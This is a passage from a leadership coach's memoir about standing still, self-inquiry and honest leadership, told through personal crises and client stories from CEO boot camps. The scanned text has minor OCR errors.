colleagues, friends, and family to\nserve your hunger for love, safety, and a sense of belonging—oh, those\nlonged-for lemon drops—you stand in the way of finding a mission that\nunites everyone in the first place.\n\nYou’re not leading when you spend your time trying to outrun your\ndemons, trying to numb yourself to the hungers that come from within.\n\nI understand the impulse. It’s a rush to, well, rush from task to task.\nMoreover, it feeds a sense of superiority: “Geez, my work must be so\nimportant . . . look how fast I’m moving!”\n\nBut it can also feed distrust and disunity; “Look how fast I’m moving,”\nwhen said by one who holds power, implies a profoundly disheartening and\nnegative statement: “Look at how slowly you’re moving.”\n\nA deeper look shows that the view is also fed by a tendency to merge\nwhat we do with who we are. “We are nothing,” we tell ourselves, “unless\nwe are doing.” Our value as humans becomes dependent on whether we’ve\ngotten the A in the class, raised the funds our nascent start-up needs, gotten\nthe right accolades from those above us, married the right partner,\npurchased the right home. I am what I do, and if what I’m doing is fast and,\ntherefore, important, then I must be worthy enough to have earned your\nrespect, your love. And if not your love, then maybe—just maybe—the love\nof my parents.\n\nWhile everyone—myself included—can fall prey to using work as a prop\nfor self-meaning, founders are particularly susceptible to this loss of self.\nThink of the many, many jerks in business whom we admire precisely\nbecause they have a single-minded focus on execution, causing everyone\naround them to pant their way through the workday.\n\nOf course, we don’t put it that way. We admire them because they are\nsuccessful—their means are justified by their accomplishments. The lure of\nlosing oneself in work is immensely seductive. What’s more, great and\nimpossible things are often achieved through this kind of merging of self\nwith a larger purpose. Yes, yes, yes, there is a power in reaching for that\nlarger-than-the-self purpose; “Ah, but a man’s reach should exceed his\ngrasp,” wrote the poet Robert Browning, “or what’s a heaven for?”\n\nThere’s audacity in reaching, in dreaming of a new way to change a\nlightbulb, to search for something on the Internet, to connect people across\ntime and space. That audacious reach should never be withheld.\n\nBut to lose one’s footing in the reaching serves no one, especially not the\none doing the reaching. It’s a lousy way to live.\nIn the fall of 2010, I stepped on a subway at the Forty-Second Street\nstation, Times Square. It was the uptown | train. I felt myself shoved and\nlooked up, angry and startled. This was no ordinary jostle.\n\nThe next thing I remember, I was lying on my back, my head cradled in\nthe lap of a cop, my body covered in blood. Coldcocked. Without\nprovocation, without warning, I’d been knocked unconscious, the soft tissue\nof my nose damaged, my cheek lacerated, and one tooth broken. I couldn’t\nremember my name, where I was headed, or who the president was. Lying\non a gumey at Bellevue, I was struck by the realization that disappearing\ninto the motion of life, losing touch with those inner worlds that define true\nsuccess, is a really lousy way to live. It was as if the promise I had made to\nmyself at eighteen, in the hospital after the suicide attempt—a promise to\nlive fully—had merged with the fears of my childhood. I had created a life\nthat was superficially rewarding but slowly killing me.\n\nOn the surface, I was thriving during what poet John Donohue would call\nmy “empty-time” life. The gifts of this hollow time included fame and\nfortune. I had gone from covering the news to being news. This period had\nbegun to feel like the crucial stage of the most important Monopoly game of\nmy life. Look how I had surprised everyone, what with my neatly stacked\nbills and a hidden pile of money. How could I possibly quit now?\n\nThe world affirmed me for my willingness, my compulsion, to give more\nand more, to do more and more. But the more I gave, the more I lost. The\nmore I lost, the closer I came to the lip of the stinking, belching hole in the\nground known as Ground Zero.\n\nWhat Needs to Be Said\n\nI don’t remember the weather, but I can guarantee you that, to me, February\n2002 felt dark, dank, and cold. I told my business partners that I was taking\na vacation and, following my therapist’s advice, booked two weeks at\nCanyon Ranch in Arizona. More important, though, I began opening to the\nfolks in my life.\n\nSo much of that time remains indistinct, but I remember the two books\nmy sister, Annie, recommended to me: Pema Chédrén’s When Things Fall\nApart and Parker’s Let Your Life Speak. Both books, as well as Sharon\nSalzberg’s Faith, flew with me to Arizona from New York.\nI spent my time at Canyon Ranch reading, learning about meditation, and\nweeping. I began to learn the importance of standing still. Still enough to\nbegin asking myself that question: What are you not saying that needs to be\nsaid?\n\nAnnie’s simple gesture, two books with the loving embrace of a big\nsister, altered the trajectory of my life. Those books introduced me to two\nprofoundly important concepts. Let Your Life Speak showed me that I was\nnot speaking to, about, or from my life but the life of another. When Things\nFall Apart helped me see that things are always falling apart; always. To\nexpect otherwise is to invite suffering. Pema taught me that we must lean\ninto the suffering and befriend it. Doing that requires just one thing: the\ncourage to be still.\n\nWhen he was a boy, my son Sam loved Maurice Sendak’s Where the Wild\nThings Are, just as I had as a boy. Sam would listen intensely as I read of\nMax’s adventures sailing to the wild things.\n\nOur favorite part was just before the wild things crowned Max king.\n\nI read, “And when he came to the place where the wild things are, they\nroared their terrible roars and gnashed their terrible teeth and rolled their\nterrible eyes and showed their terrible claws,” roaring my terrible roars,\nrolling my terrible eyes, and showing my terrible claws, and then, when the\npassage came to Max yelling at the wild things, Sam would hold up his\nhand, like a cop stopping traffic, and would say Max’s famous line: “Be\nstill.”\n\nWhen I think of standing still in empty time, it helps to think of Sam; “Be\nstill.” Sendak’s Max and my Sam both knew how to be with Wild Things.\nThe only way to tame the monsters, the demons with their terrible roars and\nterrible claws, is to be still. This is the first step to radical self-inquiry; it\nstarts with the courage to be still in the face of uncertainty.\n\nIn the months between my personal Ground Zero, my first encounters with\nBuddhist thinking, meditation, and—from Parker—the experience of a man,\nan elder, speaking openly about his struggles, I started to regain my life.\nIntrigued by these notions, I began to reboot my life. I told my business\npartners I had no intention of renewing my contract.\n\nThat first phase of my life reboot was easier than I had anticipated, but\nmy partners’ response was telling. One asked, after I told him that I had no\nidea what I was going to do next but that I was looking forward to life\nwithout a title or a business card, “What if no one calls you?”\n\nI didn’t have the courage then that I have now. Today I would respond,\n“That’d be wonderful.” But at the time, my willingness to stand in the\nuncertainty, the impermanence of everything, was still new. The year\nfollowing Ground Zero was punctuated by my deepening exploration. I\nbegan a four-year buying spree on Amazon. If it had to do with Buddhism,\nself-introspection, or existential crises, I read it.\n\nBut I was still merely a nightstand Buddhist. I had read a lot of books but\nhadn’t really leaned into them. A few months later, I attended a hip fund-\nraiser hosted by two legendary downtown musicians; it was a benefit for a\nlocal Buddhist center and the beginning of a weekend teaching retreat led\nby Pema Chédrén. Pema, with a wide grin on her shaved head, settled into a\ncushion in the middle of the room, the teacher’s seat. She immediately\nstarted teaching on the nature of things falling apart. It’s not just the\nmaterial world, she noted. All things. All. Things. Our wishes, our dreams,\nour conceptions of who and what we are supposed to be, our sense of self,\nour sadness, our joy . . . all of it. Falling apart. All the time. Right before\nour eyes.\n\nAnd that hurts. It hurts because the ego, the fragile persona we develop to\ncombat the slings and arrows of outrageous fortune and our sense of utter\nunworthiness, believes that only by keeping things exactly as they are,\nmoment to moment, can we be free of suffering.\n\nI nodded knowingly; I knew how to be a good student. “Yes,” I\nremember telling myself, “I read about this.” Good boy, I said to myself.\n\nThen, Pema did that thing Buddhist teachers are famous for doing. She\ndelivered the coup de grace, a whack upside my overconceptualizing head.\n\n“Now,” she began with a mischievous smile, “some of you are sitting\nthere thinking: ‘I got this. I understand this.’”\n\nI squirmed.\n\n“But even your understanding of this concept is falling apart all the\ntime.”\n\nI blurted out, “That’s not fair!”\n\nI had just gotten this concept, I remember feeling, and you’re telling me\nthat I can’t even hold on to getting it? She turned a twinkly eye to me and\nsaid knowingly, “Catholic, right?” She’d nailed me. Once again, I’d wanted\nnothing more than to be told how to get an A. How to get it right. This time,\nthough, the it was feeling better.\n\nLater we were each given time alone with Pema. With my heart beating\nfast and beginning to break open in ways it had never opened before, I knelt\nbefore her, the first American to be ordained a Tibetan Buddhist nun.\n\nI blubbered and stammered. The ground had just been ripped from under\nme, and I was falling. I tried to explain what was happening to me and\nPema, or “Ani” Pema, using her honorific title for nun, just smiled, tapped\nmy hand lightly, lovingly and said, “Honey, whatever it is, you’re not\nopening to it. You think you’re open. But you’re not. You need to keep\nopening.” Looking back, I see now just how terribly lost I was. But I also\nsee that I was beginning to find my way, beginning to let the forest find me.\n\nKeep opening. Stand still. Keep opening and stand still. Open up, get\ncurious, and inquire within.\n\nYears later, after I’d begun coaching, I came across another teaching by\nAni Pema in a tiny book called How to Meditate. In it, she refers to\nmeditation as the act of stripping away delusion and being with what is,\nsimply and wholly. That teaching came to mind when I was working with a\nclient.\n\n“Stop the spinning,” I’d blurted out in utter frustration and nearly yelling.\n“Stop pitching me. Stop telling me you’re crushing it, you’re killing it, and\nthat you’ve got it all figured out.” I went on: “If you had it all figured out\nyou wouldn’t be sitting on my couch. Sit still and ask yourself why things\nare the way they are and why they aren’t the way you’d like them to be.”\n\nThere it was: radical self-inquiry. The process by which self-deception\nbecomes so skillfully and compassionately exposed that no mask can hide\nus anymore. Radical in that such inquiry is rare. Radical in that it demands\nthat we stop blaming others for our lives. Compassionate in the way a good\nteacher is compassionate: stop bullshitting yourself.\n\nSlow down. Stand still. Breathe. Let the forest find you. Then you can\nbegin to ask yourself the hardest questions: Who am I? What do I believe\nabout the world? What do success and failure mean to me (and not to\neveryone else)? What kind of adult do I want to be? And, most helpful, how\nhave I been complicit in creating the conditions in my life that I say I don’t\nwant?\nCreating a Place of Belonging\n\nAll the folks who come to our company’s leadership boot camps complete\napplications in which they are encouraged to define with skill, compassion,\nand radical self-inquiry the things with which they struggle. Tracy\nLawrence’s application broke my heart. I remember her writing about her\nwish that the people at Chewse, the company she cofounded and where she\nserves as CEO, could be “just like software.”\n\nShe wanted people to be knowable, predictable. She wanted some\nsemblance of a guarantee that if the data that had been input were correct,\nthe output would be effective. In 2016, in a podcast conversation in which\nwe recalled that time, she and I spoke of her big breakthrough. A\nbreakthrough that came about only because of her willingness to enter a\ndifferent time, to stand still despite feeling as if her hair were on fire, to take\na few days and think about her leadership and her life.\n\nAt the camp, we spoke about the ways our pasts shape our presents. We\nslowed down; we stood still; we dropped the bullshitting, spinning, and the\nefforts to outrun the wild things. We inquired within. Looking puzzled,\nTracy struggled to understand how her childhood was present in her\nadulthood.\n\n“Tell me about shame,” I answered her. Scrunching up her face,\nsearching, her eyes suddenly got very wide. Her body small and still.\n\n“What do you remember?” I asked.\n\n“T was in middle school,” she said in a dreamy reverie. She was teased\nrelentlessly for having “different” hair. A mixed-race kid, her features\nweren’t precisely like everyone else’s.\n\n“What happened?” I continued, the group joining us in the stillness.\n\n“T spent the entire year eating my lunch in a bathroom stall to avoid the\nkids who were making fun of me.” Lunch, for Tracy, meant humiliation,\nsadness, and pain; and the only way to be safe was to be alone. She wept as\nshe remembered that time. She sobbed as she reentered those feelings. She\nsat still and felt the past wash over her.\n\n“Tracy,” I said, calling her back to the present. “Tracy, what does your\ncompany do?” Wiping her nose, she looked puzzled. “Tracy, tell me what\nChewse does, what’s its mission?”\n\n“We provide nutritious lunches and snacks to other start-up companies,”\nshe answered really puzzled.\n“And why is that important?” I asked.\n\nSmiling and laughing, she replied, “So that people can get out from\nbehind their desks and gather together for lunch . . . so that lunch isn’t\npainful but loving. So that no one needs to eat alone to feel safe.”\n\nHer laugh that followed her realization shook the room with power and\ngrace. In the transition from middle-schooler to adult, from child to start-up\nfounder, Tracy had buried the memories of those taunts behind a wall of\nshame, glimpsed only occasionally.\n\nBut, unknown to her conscious mind, she had also transformed that time\nof enormous pain and self-loathing into a deeply held purpose. She was, of\ncourse, providing nutritious meals to folks at other start-up companies—her\npeers if not her friends. But she was also giving them an opportunity to\nbelong—something denied her by the middle-school bullies of her past.\n\nShe reached into a dark, shame-filled place in her past and pulled from it\na power: the power to belong.\n\nWhat’s more, by stilling her wild things (who danced in the moonlight of\nher memory telling her again and again that she didn’t belong), she saw that\nher unconscious had given a way to transform that pain into a purpose.\n\nIn the months that followed that realization she changed the company’s\nmission statement to include the word Jove and added a heart to the logo.\nShe embraced the painful roots of her company’s founding, realizing that\nChewse wasn’t merely an attempt to “disrupt the food delivery business”\nbut an opportunity to give others what she herself had lacked: community.\n\nChewse then moved closer to a start-up’s holy grail, profitability, and\nclosed its largest round of financing. But, most important, Tracy no longer\nwonders why she cares so much about the business succeeding, why she\nworries so much about failure. She understands her sacred mission and,\ntherefore, her core as a leader.\n\nWhen you learn to stand still in lost and empty times, then the forest can\nfind you and, what’s more, you can find yourself.\n\nJournaling Invitations\n\n* In what ways do I deplete myself and run myself\ninto the ground?\ne Where am I running from and where to?\n\n* Why have I allowed myself to be so exhausted?\nChapter 4\nRemembering Who You Are\n\nTt was the first night of one of our CEO boot camps. We were in Colorado;\nthe aspens were golden under a bluish-black night. We were in a circle,\nestablishing the safety of this community that, over the next few days,\nwould come together, stand still, and begin the process of remembering\nwho they were—the whys behind their life choices.\n\n“The bullshitting stops here,” I said, staring each of them in the eye. “No\nmore spinning. No more lying.” As I spoke, I could feel their bodies tense,\ncontract in fear, and then relax as they let go and realized that I meant it.\n“No more feeding your delusional thoughts about how you’re crushing\nit... how you’ve got it all figured it out.” I paced the room like the\npreachers I so admire. “No more . . . because it only feeds that whispery\nvoice in your head telling you again and again that you’re an impostor.”\n\nThe next morning, we again met in a circle and then sent campers off on\na walk with a partner, someone they hadn’t known before coming to the\ncamp. We asked each pair to speak to each other about a single topic: “What\nI wish my colleagues knew about me is. . .”\n\nThe pairs returned from their walk more awake, more alive—energized\nby the connections they’d formed. We asked them to speak to the circle and\nto share their partner’s story. Elbows on knees to steady himself, one\ncamper took a deep breath and recounted what he’d heard from his walking\ncompanion, a young woman who had seemed skeptical and guarded the\nnight before: “What I wish the people I worked with as well as the investors\nthinking about putting money into my company knew about me is. . . . that I\nhave a rare blood cancer and, if my treatment over the next six months\ndoesn’t succeed, 111] be dead within the year.”\n\nWe gasped.\n\nRevealing her secret, something only her husband and a few close friends\nknew, spoken aloud, broke open her warrior heart. She’d kept the secret to\nprotect the people with whom she worked. She’d kept the secret for fear\nthat the investors wouldn’t fund a dying woman’s company. She carried the\nburden of that secret so that everyone who had believed in her, who had\ngiven up so much to help realize the dream of her company, wouldn’t be at\nrisk if the company couldn’t secure the next round of financing.\n\nIn that circle, she began to feel the shift that comes from taking your seat\nas the authentic, true, frightened, deeply feeling adult that you are.\n\nWeeping, she interjected, “And I thought this was going to be just\nanother boring leadership workshop.” We burst out laughing, joy added to\nthe grief and fear.\n\nWhen we stand still, we run the risk of remembering who we are. When\nwe stop the spinning, we run the risk of confronting the fears, the demons\nwho have chased us all our lives. When we stop the bullshitting, the\npretending that we’re crushing it, that we’ve got it all figured out, we run\nthe risk of being overwhelmed by the realities of all that we carry—the\nburdens we’re convinced must remain secret to keep us and those we love\nsafe, warm, and happy.\n\nBut the spinning prevents us from being who we really are. And\nperversely prevents the people whom we love, the people we’re trying to\nprotect, from knowing, trusting, and seeing us. I know the wish to be seen. I\nknow the need to show up to be seen.\n\nMy son Michael and I love movies; it’s one of our things. One night,\nyears ago, we went to the movies. He was excited for me to see this film;\nhe’d read the book and was excited to share the story with me.\n\nAs the film unfolded, I saw it as a coming-of-age story of a young man,\nabout Michael’s age. I even enjoyed the elements that were predictable.\nSettling in, I watched the film and enjoyed my thoughts about how the main\ncharacter was (and was not) like Michael. Then, a few minutes before the\nend of the film, the plot twisted. And suddenly the film was no longer about\na boy like my son but more about a boy like I was. It wasn’t Michael’s life\non the screen but mine.\nI lost my breath and panicked. I was thrown back in time to my\nchildhood, to events I’d tried so hard to banish from my conscious mind. I\nwept.\n\nAs the film ended and the lights came up and the theater staff moved\nthrough the rows, picking up discarded buckets of popcorn, I remained\nfrozen in my seat, weeping, Michael by my side.\n\nUnfrozen and finally able to move, I walked outside with my son, and I\nlet us into my car. Closing the door, and in the safety of the darkened car, I\nwept some more. And then Michael said it, he gave me the line that showed\nthat, despite his young age, he possessed a deep wisdom.\n\n“Dad,” he said, “you might as well tell me what’s going on, because if\nyou don’t, I’m going to make shit up and it’s gonna be negative about me.”\n\nDad, he’d challenged me, you might as well remember. You might as\nwell show up, as you are. You might as well tell me who you are, because if\nyou don’t, I’m going to invent things, and those things will stand between\nus, keeping us from being close.\n\nUntil that moment, I hadn’t realized that this secret was one of the things\nI’d wished those who loved me knew about me.\n\nAuthentic is such a worn-out adjective; it can feel meaningless. I suppose\ntherefore I prefer grammatically challenged phrases such as “broken-open-\nhearted warriors.” The action that creates true authenticity is embedded in\nthat adjectival phrase. But the call is to authenticity. The call is to be real; to\nshow up mad, scared, fearless, or joyful—or all the above.\n\nWhen clients answer the challenge to stand still, stop the spinning, and be\nwith the truth of their existence, they take their seats as warrior CEOs—\nstrong backs and open hearts.\n\nIn the months that followed, the camper facing terminal illness shared her\nstory with not only a wider circle of friends but also her colleagues and,\neventually, her investors. Her community rallied and held her—standing\nstill, if you will, alongside her.\n\nThe most important part of the story was that the treatment she received\nworked. She’s alive today. But another development shouldn’t be\noverlooked: In sharing her secret, she created the conditions in which her\ncolleagues could share her burden. She was no longer the self-appointed\nguardian of their safety; they came together to care for each other.\n\nI see it all the time. When leaders, parents, lovers choose to share the\nreality of their heart, it gives everyone in their lives the chance to know\nthem, to hold ‏م.--صعطا‎ trust each other.\n\nI’m reminded of another client. He came to me worried because, after\nweeks and weeks of assuring his employees that their financing was a sure\nthing and that a term sheet for a new round of capital was “just days away,”\nhe had to face the reality that the investors had broken their word and were\nbacking away.\n\n“What do I tell them?” he asked me, quaking in fear.\n\n“How about the truth?” I suggested.\n\n“The truth? Are you kidding me? If they find out that investors are\nbailing, they’ ll hit the streets. Résumés will be flying out the door.”\n\n“Well, would you rather they stay for a lie?”\n\nHe told the truth and they stayed. Not only did they stay, but they\nvolunteered to take pay cuts to help the company manage its cash.\n\n“Honey.” Once again, I hear Pema Chédrén’s voice. “Honey, whatever it\nis, you’re not opening to it. You think you’re open. But you’re not. You\nneed to keep opening.”\n\nWe don’t stand still because we are afraid of what we will find. We don’t\nshare what’s really going on because we have misguided notions of dutiful\ncaretaking. These warped, childlike views serve only to exacerbate our\nisolation and, contrary to what we’ve been taught, destroy trust. I often\nthink of the moment after we’ve chosen to stand still as one in which we’re\nfaced with a threshold, a doorway.\n\nThere are, of course, risks if we share too much. Sometimes, in the guise\nof radical self-inquiry, we tip over into what some may call radical\ntransparency. Too often, though, we convince ourselves that we are being\ntransparent when what we’re really doing is shifting the responsibility onto\nothers. “Here,” we wordlessly say, “I can’t bear my anxiety, so you carry it\nfor a while.”\n\nBut I think the far greater risk of standing still, opening to what is, is that\nwe may end up remembering our name.\n\nLife at the Top of the Pyramid\n\nShame keeps us from remembering. Shame and fear of being humiliated\nthat our inner doubts will be revealed and the persistent whispery voices\ncalling us unbearable names will turn out to have been right all along.\nBut an equally dangerous conceit keeps us from taking our seats as\nbroken-open warriors. That is, an insidious need to see ourselves as the only\none capable to lead. So, there we sit, alone in our struggles, burdened by the\nweariness of all the intellectual and externally generated demands, decrying\nthe inability of anyone else in the organization, the family, the state, or—\ndare I name it—the relationship, to make a damn decision.\n\nWhen working with a group, 1:11 often jump to a whiteboard and draw a\nsimple triangle. “What is this?” ]' [1 ask again and again until we zero in on\ntheir internalized views of hierarchy. “And who sits atop this pyramid?”\nThe boss—“el Jefe”—1me, the president, our parents, or even God?\n\nIn dissecting this internalized view, we reveal how we buy into the trap\nof the pyramid of a classic command-and-control organizational structure\nout of an attempt to quiet the whispery voices of our perceived\ninadequacies. But it doesn’t work. The whispery voices in your head know\nbetter. They know that, sitting atop the pyramid, pretending to always have\nit together, always knowing the answers, is a delusion. Moreover, the\ndelusion is a double bind.\n\nOn the one hand, those voices know that, often, we haven’t a clue as to\nhow to proceed. In that knowledge, we live with the fear of being unmasked\nas an impostor. But, on the other hand, the shame of our not knowing leads\nus to believe that everyone else does know; everyone else has it all figured\nout. Then we do something particularly clever: we turn our shameful fear\ninto further evidence of our failings as leaders, as adults, as humans. So, we\nspin, we bullshit, and play along in the shell game in which the bean of\ntruth keeps disappearing under swiftly shifting shells.\n\nWe sit atop the pyramid, pretending we know. Our colleagues outwardly\nbemoan our inability to delegate and share authority and inwardly revel in\nthe relief that that they don’t have to bear the consequences of a poor\ndecision. And everyone plays the shell game.\n\nThe game goes on and on. Slowly then, organizations become a fertile\nfield where we plant the seeds of our childhood struggles. Slowly,\ninexorably, the top-down inauthentically led group becomes a canvas where\nwe paint out scenes of our past. Slowly, assuredly, team members then\nrespond in kind, replaying the struggles of their families of origin.\n\nAnother of Carl Jung’s admonitions reverberates: “Until you make the\nunconscious conscious, it will direct your life and you will call it fate.” We\nlook at our organizations and logically conclude that they are fated to be\ndysfunctional messes. That we, because of our lack of skill, are fated to fail\nas leaders. To never feel safe enough, warm enough, or happy enough.\n\nThere’s the Dad, pretending that all is well even as his tense body can\nonly relax with a Pabst Blue Ribbon in hand. There’s the Mom, talking to\nChrist not in prayer but as if he’d pulled up a chair and were sharing a pack\nof Winstons. And there we are, playing the same games of hide-and-seek,\nhalf in and half out, there but not there. And there we all are, collectively\npretending that the product works, the company’s future is bright, and that\nwe all love and trust each other.\n\nIt was January. I’d flown back to New York from my home in Boulder\nfor a week of client work. The skies were sharp and clear, blue and crisp as\nthe skies of Colorado, and the heavy gray clouds that normally dominate\nNew York winters were nowhere to be seen.\n\nI met the senior leaders of my client’s company in a windowless\nconference room. The group, all twenty-five of us, shared the tasks of\narranging the chairs into a circle, the better to be real with one another. No\ndesks or conference tables to hide behind. No walls of intellectualized\nrigmarole to keep us from seeing what was really going on.\n\nAs I often will in group settings, I opened the session reading from Lao\nTzu’s ancient poem: “Always we hope / someone else has the answer, some\nother place will be / better, / some other time, / it will turn 000... This is\nit.”\n\nThere is no point in peering out a window, he admonishes, or looking to\nsomeone for the answer. The answer, I told them, is right here, in the middle\nof the room.\n\nSo, what was the question we’d gathered to sort through? Why was the\ncompany so damned conflict avoidant?\n\nMy client was one of the co-founders, and the company itself was\nincredibly successful. In its brief history, its gross revenues had grown to\nmore than $1 billion and its business model was being replicated in other\ncategories across the landscape. It was striving to blend doing well by doing\ngood.\n\nAs a result, the company was, in a word, beloved. But its patina of nice\nbelied a deeper truth. Not only were most of the leaders conflict avoidant\nbut, like the boot-camper with his greedy head of sales, they’d outsourced\ntheir unacceptable feelings, their naturally occurring aggressions, and\nprojected them onto two members of the senior team who constantly battled\neach other and belittled each other’s teams.\n\nMoreover, these two each reported to one of the two co-founders,\npersonifying and amplifying the split and unresolved conflicts between the\nleaders. Overtly nice and covertly devious, the management team led lives\nof quiet, seething anger. Quietly avoiding any hint of conflict. So nice.\n\nPacing the room, I probed. Turning to one of the co-founders, I asked,\nguessing really, “Did you grow up with a lot of violence at home?”\n\n“Violence?” he asked, confirming my word choice. “No. No violence.”\n\nConfused and unsure, I turned away. And with my back to him he said,\n“But we did have a lot of yelling.”\n\nStopped in my tracks, I looked around the room and guessed again:\n“How many of you grew up in homes with a lot of yelling?” Twenty-three\nof the twenty-five employees raised their hands.\n\nThe problem wasn’t conflict avoidance, I pointed out. The problem was\nfear: leftover childhood fears. Fear of the consequences of anger. And\nbecause the most senior people had never acknowledged the ways their\nleadership styles, the choices they made as leaders, were rooted in old\npatterns, the patterns were replicated and amplified.\n\nThe problem, I added, wasn’t the two cultural misfits who couldn’t get\nalong with each other or the rest of the team. The problem was that they’d\nall collectively bought into the game of hiding the truth.\n\nUntil the leaders embrace the entirety of their pasts, until they\nacknowledge the collective wish to sweep all conflict under the rug, the\nconflicts will be driven underground. That doesn’t mean they’ Il stay buried.\nInstead, they reemerge, with others voicing these roles, proxies for others’\nresentments and frustrations.\n\nIt takes a warrior’s courage to stand still long enough for us to inquire\nwithin and remember our past.\n\nThis Being So, So What?\n\nWhen I was ten, my father came home one night, just around Christmas,\n\nand announced that the company he’d worked for for thirty years or so was\nclosing, and he’d be out of a job. Watching my father struggle over the next\nfew years, bouncing from one union-provided job to another, made me feel\nthat I could never depend on anyone else to employ him. Watching my\nfather lose what little self-confidence he had, I swore I’d never let that\nhappen to me. That view—that I’d always be responsible for my own\nemployment—defined my career choices. As with so many superpowers,\nthe view contained both a dark and light side.\n\nThe light side gave me a profound and treasured sense of self-reliance.\nCome hell or high water, I could always make money. And even if I didn’t\nknow how to do something, I could learn. And with enough knowledge, I\ncould do or fix anything.\n\nThe dark side of that self-reliant superpower has shown up as an antsy\nunease. Making it difficult for me to stay put for too long. But even that\ndark side has its own light side. The unease has led me through multiple\nlives.\n\nDozens of events shape our careers, our lives. There are the little\nconversations at the end of the day, over a cup of coffee, that reframe\neverything. There are the daily mantras we grow up with that shape our\nvalues and our sense of the right thing to do in life. And there are the large\nevents, like when my father lost his job, that cause us to take on a new point\nof view—a demon, if you will. In my case, that view has sometimes cost\nme but often caused me to push ahead, to try different things, to explore, to\ntake risks. In a way, I wouldn’t be the man I am today had I not watched my\nfather struggle through his years of un- and underemployment and had it\nnot been capped by that fearful advice he’d given me about the monkey’s\nass showing. For good or for ill, and in full-blown rebellion against my\nfather, I’ve never been afraid to let more of my ass show.\n\nToday, as a coach, I consider myself one of the luckiest people alive. I get\nto help people by listening deeply and holding on to their stories while they\ndo their work. And among all the things I find so remarkable are the ways\nin which our lives are shaped by these conversations from our pasts.\n\nIt helps to understand the stories of our lives. It helps to see clearly the\nways in which a word or two changes everything. Seeing the patterns that\nripple out from those tossed stones of events, conversations, and\ninteractions allows us—if nothing else—to remember even more clearly\nhow we became who we are. As I often say with my clients, a good first\nstep to figuring out where you want to go is remembering how you got here.\n\nThe call to lead well is a call to be brave and to say true things. To say to\nour colleagues, we’re scared, but we still believe. To say that we may be\ndying—either figuratively because the investors don’t believe or, in some\ncases literally.\n\nIf we’re truly to inquire within, if we’re truly to care to look and\nremember what it is we believe, if we’re to build organizations in which we\ntell people what’s really going on lest they “make shit up,” then we must be\nwilling to open to the reality of life just as it is. Several years ago, I\nbastardized an old Zen saying I’d stumbled upon. I’ve repeated my version\nso often that I can’t recall the original. But my version feels more resonant\nperhaps because of my own lifetime of hiding: This being so, so what?\n\nTime and again I’ve watched hearts break open, so that true and authentic\nleaders can emerge. But that process depends on a brave first step: facing\nthe reality of what is and not being deluded by the powerful, seductive\ndreams of what can be.\n\nOf course, this doesn’t mean there’s no role for dreams. We need dreams.\nBut willfully ignoring what is true is not the same as dreaming. It’s\ndelusion; and delusion leads to terrible decisions and, even worse, the\ndestruction of trust.\n\nThe first act of becoming a leader is to recognize this being so. From that\nplace, we get to recognize what skills we need to develop and who we\nreally are (and are not) as leaders, and to share our truth in a way that\ncreates authentic, powerful relationships—with our peers, colleagues, and\nfamilies. Grant us leaders who can do this and we just may create\ninstitutions that are less violent to the self, our communities, and our planet.\n\nTo open to the reality of life as it is—this is the greatest challenge of all.\n\nOr, put more clearly, the call is to stand still and do the work of self-\ninquiry. Remember who you are, what you believe about the world, and\nthen, risks be damned, lead from that place of broken-open-hearted\nwarriorship.\n\nJournaling Invitations\n\n* Who is the person I’ve been all my life?\n\n* What can that person teach me about becoming the\nleader I want to be?\n* What was the story my family told about being real,\nbeing vulnerable, being true?\n\n* What do I believe about vulnerability and how\nmight that serve me?\nChapter 5\nThe Immense Sky of the Irrational\nOther\n\nWe sat at the kitchen table, a lit Winston burned in the Bakelite ashtray.\nMy dad, in his usual seat at the head of the table, and I, to his right, picking\nat a tear in the vinyl tablecloth. My mom, in an apron, paced around the\nkitchen, walking in and through the swirling cigarette smoke.\n\n“T met Art Garfunkel in the bowling alley on Snyder Avenue.” My mom\ntalked but it wasn’t clear whom she was speaking to.\n\nI looked up from my bowl of Cap’n Crunch, the spoon dripping milk, and\nbraced myself. “Shit,” I said to myself, “she’s starting up again, Where the\nhell is this gonna go?” I tried to catch my father’s eyes, but he stared at his\nopened copy of the Daily News, his Parker pen in hand fixing the paper’s\ntypos.\n\n“Your father was bowling with his league and I was waiting for him to\nfinish up. I had bowled a 154 about an hour earlier so I was pretty happy.\nThe 154 was my new league high...”\n\nMy body tensed; I watched Dad’s reactions. Nothing but the scratch-\nscratch of his pen on the paper.\n\n“Anyway, I was sitting there, waiting for your father, when this tall,\nskinny kid with a big mop of hair sits on the stool next to me. He was about\nyour brother’s age, eighteen or nineteen, and he was too skinny. All the kids\nwere skinny then because they were all on drugs. You know that drugs do\nthat, don’t you?”\nShe looked at me for permission to continue. I nodded.\n\n“Okay, so I’m waiting for your father and this skinny kid with a blond\nmop of hair walks in to the alley and takes the stool at the snack bar right\nnext to me. ‘Just a burger, please,’ says the kid. ‘A burger and a glass of\nwater.’ So, I asked him, ‘Don’t you want no fries or nothing?’\n\n“Well, he turned and looked at me like I was some kind of a ghost or\nsomething. ‘No,’ he says. Real slow and spooky-like. ‘Are you all right?’ I\nsay to him. Well, at that he perked up and we got to talking. He told me his\nname. Garfunkel, he says, Art Garfunkel. It was a pretty funny name, so I\nnever forgot it. Later, when I heard it all over the place I knew him.”\n\nI nodded.\n\n“Anyway. . . . That’s why he wrote that song, because of me. You know,\n“Mrs. Robinson.’ That’s me. I’m Mrs. Robinson.”\n\n“Fuck! Is it me?” I asked myself silently, “Am I crazy?”\n\n“Dad,” I said out loud, trying to disrupt her flow. No response. “Dad!”\n\n“Whaaat?” He looked up from his paper and into my eyes. In the silence,\nwith my eyes, I pleaded with him to do something, to say something. He\nshrugged.\n\nI finished my cereal, washed my bow] at the sink, and turned to look at\nher. An apron covered her burnt-orange sweater and polyester slacks. She’d\nlit her own Winston and taken a drag on a cigarette; the exhaled smoke\nencircled her head. Slowly, coldly, to reassure myself of the ground beneath\nmy feet and the reality of my world, I turned to my mother: “You are not\nMrs. Robinson.” I stared at her, daring her to say something. She stared\nback with only a sliver of recognition of who I was.\n\n“Hey, hey, hey . . ,” said my father. “Don’t talk to your mother like\nthat.”\n\n“Like what? Dad, this is crazy.”\n\n“Your mother is not... she’s not... just don’t talk like that. Just don’t\nupset your mother.” Don’t. Don’t. Don’t. Upset. Your mother. Don’t.\n\nI stood and walked into my room. I wrote a note to my brother John: 1\ncan’t take it. Not sure when 111 be back. Not sure if I’ll be back.”\n\nKoo-koo-ka-choo, motherfucker, koo-koo-ka-choo. Koo-koo-ka-choo,; get\nme the fuck out of here.\n\nI grabbed my jacket and headed out the door. Choking on the words I\nwanted to shout back, I ran out and away, making my way to the A train, to\nBrooklyn, to Coney Island.\nBeing fifteen was hard. I often found myself pushing back against 